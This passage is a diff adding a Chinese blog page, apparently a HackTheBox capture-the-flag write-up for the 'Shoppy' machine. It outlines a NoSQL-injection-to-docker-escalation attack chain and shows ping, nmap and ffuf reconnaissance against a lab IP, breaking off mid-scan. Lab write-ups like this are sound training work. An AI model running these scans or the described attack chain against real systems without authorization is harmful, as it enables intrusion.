@@ -1,0 +1,852 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：目录扫描、子域名扫描、SQL注入、万能密码、sudo、二进制反编译、硬编码、docker特权组">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shoppy-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/09/24/Shoppy-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：目录扫描、子域名扫描、SQL注入、万能密码、sudo、二进制反编译、硬编码、docker特权组">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/10.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/11.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/12.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/13.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/14.png">
+<meta property="article:published_time" content="2024-09-24T15:50:55.000Z">
+<meta property="article:modified_time" content="2025-02-25T07:53:48.836Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Shoppy-htb-writeup/1.png">
+  
+  
+  
+  <title>Shoppy-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
+                    
+                    <span>SQLMap命令生成器</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/cvssjs/" target="_self">
+                    
+                    <span>CVSSv3.1 漏洞评分</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Shoppy-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-24 23:50" pubdate>
+          2024年9月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          147 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Shoppy-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：目录扫描、子域名扫描、SQL注入、万能密码、sudo、二进制反编译、硬编码、docker特权组</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://blog.heapbytes.tech/rooms/hackthebox/easy/shoppy</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2023/01/14/htb-shoppy.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、靶机介绍</p>
+<p><code>关于Shoppy</code><br><code>Shoppy 是一款简单的 Linux 机器，其特点是带有登录面板和用户搜索功能的网站，但容易受到 NoSQL 注入攻击。攻击者可以利用该漏洞获取所有用户的密码哈希值。破解其中一位用户的密码哈希值后，我们可以验证服务器上运行的 Mattermost 聊天，从而获取用户“jaeger”的 SSH 凭据。通过逆向工程密码管理器二进制文件，可以横向移动到用户“deploy”，从而获取用户的密码。我们发现用户“deploy”是组“docker”的成员。可以利用其权限读取根标志。</code></p>
+<p>2、首先测试下靶机连通率</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(kali㉿offsec)-[~/Desktop]<br>└─$<span class="hljs-built_in"> ping </span>10.10.11.180 -c 4                                   <span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>10.10.11.180 (10.10.11.180) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.180: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=141 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.180: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=138 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.180: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=130 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.180: <span class="hljs-attribute">icmp_seq</span>=4 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=131 ms<br><br>--- 10.10.11.180<span class="hljs-built_in"> ping </span>statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3012ms<br>rtt min/avg/max/mdev = 129.998/135.048/140.680/4.476 ms<br></code></pre></td></tr></table></figure>
+
+<p>3、扫描下开放端口情况</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs coq">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- -Pn <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.180</span> --min-rate=<span class="hljs-number">10000</span>   <br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-09</span><span class="hljs-number">-24</span> <span class="hljs-number">15</span>:<span class="hljs-number">12</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.180</span><br>Host is up (<span class="hljs-number">0.13</span>s latency).<br>Not shown: <span class="hljs-number">65532</span> closed tcp ports (reset)<br>PORT     STATE SERVICE<br><span class="hljs-number">22</span>/tcp   open  ssh<br><span class="hljs-number">80</span>/tcp   open  http<br><span class="hljs-number">9093</span>/tcp open  copycat<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-built_in">in</span> <span class="hljs-number">16.05</span> seconds<br>                                                                                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p22,<span class="hljs-number">80</span>,<span class="hljs-number">9093</span> -sC -sV -Pn <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.180</span> --min-rate=<span class="hljs-number">10000</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-09</span><span class="hljs-number">-24</span> <span class="hljs-number">15</span>:<span class="hljs-number">13</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.180</span><br>Host is up (<span class="hljs-number">0.13</span>s latency).<br><br>PORT     STATE SERVICE  VERSION<br><span class="hljs-number">22</span>/tcp   open  ssh      OpenSSH <span class="hljs-number">8.4</span>p1 Debian <span class="hljs-number">5</span>+deb11u1 (protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">3072</span> <span class="hljs-number">9</span>e:<span class="hljs-number">5</span>e:<span class="hljs-number">83</span>:<span class="hljs-number">51</span>:d9:<span class="hljs-number">9</span>f:<span class="hljs-number">89</span>:ea:<span class="hljs-number">47</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">12</span>:eb:<span class="hljs-number">81</span>:f9:<span class="hljs-number">22</span>:c0 (RSA)<br>|   <span class="hljs-type">256</span> <span class="hljs-number">58</span>:<span class="hljs-number">57</span>:ee:eb:<span class="hljs-number">06</span>:<span class="hljs-number">50</span>:<span class="hljs-number">03</span>:<span class="hljs-number">7</span>c:<span class="hljs-number">84</span>:<span class="hljs-number">63</span>:d7:a3:<span class="hljs-number">41</span>:<span class="hljs-number">5</span>b:<span class="hljs-number">1</span>a:d5 (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">3</span>e:<span class="hljs-number">9</span>d:<span class="hljs-number">0</span>a:<span class="hljs-number">42</span>:<span class="hljs-number">90</span>:<span class="hljs-number">44</span>:<span class="hljs-number">38</span>:<span class="hljs-number">60</span>:b3:b6:<span class="hljs-number">2</span>c:e9:bd:<span class="hljs-number">9</span>a:<span class="hljs-number">67</span>:<span class="hljs-number">54</span> (ED25519)<br><span class="hljs-number">80</span>/tcp   open  http     nginx <span class="hljs-number">1.23</span><span class="hljs-number">.1</span><br>|<span class="hljs-type">_http</span>-title: Did not follow redirect to http://shoppy.htb<br>|<span class="hljs-type">_http</span>-server-header: nginx/<span class="hljs-number">1.23</span><span class="hljs-number">.1</span><br><span class="hljs-number">9093</span>/tcp open  copycat?<br>| <span class="hljs-type">fingerprint</span>-strings: <br>|   <span class="hljs-type">GenericLines</span>: <br>|     <span class="hljs-type">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">400</span> Bad Request<br>|     <span class="hljs-type">Content</span>-<span class="hljs-keyword">Type</span>: text/plain; charset=utf<span class="hljs-number">-8</span><br>|     <span class="hljs-type">Connection</span>: close<br>|     <span class="hljs-type">Request</span><br>|   <span class="hljs-type">GetRequest</span>, HTTPOptions: <br>|     <span class="hljs-type">HTTP</span>/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK<br>|     <span class="hljs-type">Content</span>-<span class="hljs-keyword">Type</span>: text/plain; version=<span class="hljs-number">0.0</span><span class="hljs-number">.4</span>; charset=utf<span class="hljs-number">-8</span><br>|     <span class="hljs-type">Date</span>: Tue, <span class="hljs-number">24</span> Sep <span class="hljs-number">2024</span> <span class="hljs-number">07</span>:<span class="hljs-number">03</span>:<span class="hljs-number">02</span> GMT<br>|     <span class="hljs-type">HELP</span> go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated <span class="hljs-built_in">by</span> the Go runtime.<br>|     <span class="hljs-type">TYPE</span> go_gc_cycles_automatic_gc_cycles_total counter<br>|     <span class="hljs-type">go_gc_cycles_automatic_gc_cycles_total</span> <span class="hljs-number">3</span><br>|     <span class="hljs-type">HELP</span> go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced <span class="hljs-built_in">by</span> the application.<br>|     <span class="hljs-type">TYPE</span> go_gc_cycles_forced_gc_cycles_total counter<br>|     <span class="hljs-type">go_gc_cycles_forced_gc_cycles_total</span> <span class="hljs-number">0</span><br>|     <span class="hljs-type">HELP</span> go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.<br>|     <span class="hljs-type">TYPE</span> go_gc_cycles_total_gc_cycles_total counter<br>|     <span class="hljs-type">go_gc_cycles_total_gc_cycles_total</span> <span class="hljs-number">3</span><br>|     <span class="hljs-type">HELP</span> go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.<br>|     <span class="hljs-type">TYPE</span> go_gc_duration_seconds summary<br>|     <span class="hljs-type">go_gc_duration_seconds</span>&#123;quantile=<span class="hljs-string">&quot;0&quot;</span>&#125; <span class="hljs-number">1.7823e-05</span><br>|     <span class="hljs-type">go_gc_duration_seconds</span>&#123;quantile=<span class="hljs-string">&quot;0.25&quot;</span>&#125; <span class="hljs-number">1.7823e-05</span><br>|<span class="hljs-type">_</span>    go_gc_dur<br><span class="hljs-number">1</span> service unrecognized despite returning data. <span class="hljs-keyword">If</span> you know the service/version, please submit the following fingerprint <span class="hljs-built_in">at</span> https://nmap.org/cgi-bin/submit.cgi?new-service :<br></code></pre></td></tr></table></figure>
+
+<p>4、这里绑定下端口扫描发现的域名信息</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿offsec)-<span class="hljs-string">[~/Desktop]</span><br>└─$ echo <span class="hljs-string">&quot;10.10.11.180 shoppy.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-number">10.10.11.180</span> shoppy.htb<br></code></pre></td></tr></table></figure>
+
+<p>5、然后查看下该域名下的网站内容信息</p>
+<p><code>http://shoppy.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、这里我们使用ffuf扫描下网站目录情况</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">ffuf</span> <span class="hljs-string">-u</span> <span class="hljs-string">http://shoppy.htb/FUZZ</span> <span class="hljs-string">-w</span> <span class="hljs-string">/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><br>        <span class="hljs-string">/&#x27;___\</span>  <span class="hljs-string">/&#x27;___\</span>           <span class="hljs-string">/&#x27;___\</span>       <br>       <span class="hljs-string">/\</span> <span class="hljs-string">\__/</span> <span class="hljs-string">/\</span> <span class="hljs-string">\__/</span>  <span class="hljs-string">__</span>  <span class="hljs-string">__</span>  <span class="hljs-string">/\</span> <span class="hljs-string">\__/</span>       <br>       <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">,__\\</span> <span class="hljs-string">\</span> <span class="hljs-string">,__\/\</span> <span class="hljs-string">\/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">,__\</span>      <br>        <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span>      <br>         <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\____/</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>       <br>          <span class="hljs-string">\/_/</span>    <span class="hljs-string">\/_/</span>   <span class="hljs-string">\/___/</span>    <span class="hljs-string">\/_/</span>       <br><br>       <span class="hljs-string">v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><br> <span class="hljs-string">::</span> <span class="hljs-attr">Method           :</span> <span class="hljs-string">GET</span><br> <span class="hljs-string">::</span> <span class="hljs-attr">URL              :</span> <span class="hljs-string">http://shoppy.htb/FUZZ</span><br> <span class="hljs-string">::</span> <span class="hljs-attr">Wordlist         : FUZZ:</span> <span class="hljs-string">/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br> <span class="hljs-string">::</span> <span class="hljs-attr">Follow redirects :</span> <span class="hljs-literal">false</span><br> <span class="hljs-string">::</span> <span class="hljs-attr">Calibration      :</span> <span class="hljs-literal">false</span><br> <span class="hljs-string">::</span> <span class="hljs-attr">Timeout          :</span> <span class="hljs-number">10</span><br> <span class="hljs-string">::</span> <span class="hljs-attr">Threads          :</span> <span class="hljs-number">40</span><br> <span class="hljs-string">::</span> <span class="hljs-attr">Matcher          : Response status:</span> <span class="hljs-number">200</span><span class="hljs-number">-299</span><span class="hljs-string">,301,302,307,401,403,405,500</span><br><span class="hljs-string">________________________________________________</span><br><br><span class="hljs-string">images</span>                  [<span class="hljs-attr">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">179</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">7</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">11</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">144ms</span>]<br><span class="hljs-comment">#                       [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 144ms]</span><br><span class="hljs-comment"># directory-list-2.3-medium.txt [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 145ms]</span><br><span class="hljs-comment"># This work is licensed under the Creative Commons [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 200ms]</span><br><span class="hljs-comment">#                       [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 213ms]</span><br><span class="hljs-comment">#                       [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 213ms]</span><br><span class="hljs-comment"># Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 219ms]</span><br><span class="hljs-comment"># on at least 2 different hosts [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 219ms]</span><br><span class="hljs-comment"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 304ms]</span><br>                        [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">2178</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">853</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">57</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">301ms</span>]<br><span class="hljs-comment"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 305ms]</span><br><span class="hljs-comment"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 305ms]</span><br><span class="hljs-comment"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 305ms]</span><br><span class="hljs-comment"># Copyright 2007 James Fisher [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 308ms]</span><br><span class="hljs-comment">#                       [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 309ms]</span><br><span class="hljs-string">login</span>                   [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">1074</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">152</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">26</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">125ms</span>]<br><span class="hljs-string">admin</span>                   [<span class="hljs-attr">Status:</span> <span class="hljs-number">302</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">28</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">4</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">1</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">121ms</span>]<br><span class="hljs-string">assets</span>                  [<span class="hljs-attr">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">179</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">7</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">11</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">127ms</span>]<br><span class="hljs-string">css</span>                     [<span class="hljs-attr">Status:</span> <span 